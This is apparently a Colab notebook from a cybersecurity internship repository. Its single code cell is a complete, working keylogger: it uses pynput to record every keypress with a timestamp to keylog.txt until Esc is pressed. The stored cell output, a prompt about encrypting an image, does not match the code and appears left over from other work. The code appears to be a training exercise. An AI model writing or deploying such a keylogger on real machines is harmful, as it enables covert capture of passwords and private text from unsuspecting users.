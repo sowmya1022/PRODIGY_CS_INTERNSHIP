{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "from pynput import keyboard\n",
        "import logging\n",
        "\n",
        "# Set up logging to file\n",
        "log_file = \"keylog.txt\"\n",
        "logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')\n",
        "\n",
        "def on_press(key):\n",
        "    try:\n",
        "        logging.info(f'{key.char}')\n",
        "    except AttributeError:\n",
        "        logging.info(f'{key}')\n",
        "\n",
        "def on_release(key):\n",
        "    # You can set up a condition to stop the keylogger here\n",
        "    if key == keyboard.Key.esc:\n",
        "        return False\n",
        "\n",
        "# Set up the listener\n",
        "with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n",
        "    listener.join()\n"
      ],
      "metadata": {
        "id": "2SPBAzNm7TVF",
        "outputId": "2e26f957-188a-402c-b125-0ff4fa3736e9",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "execution_count": null,
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Enter the path to the image to encrypt: GHJJ\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "jJIR8vXiBN1o"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}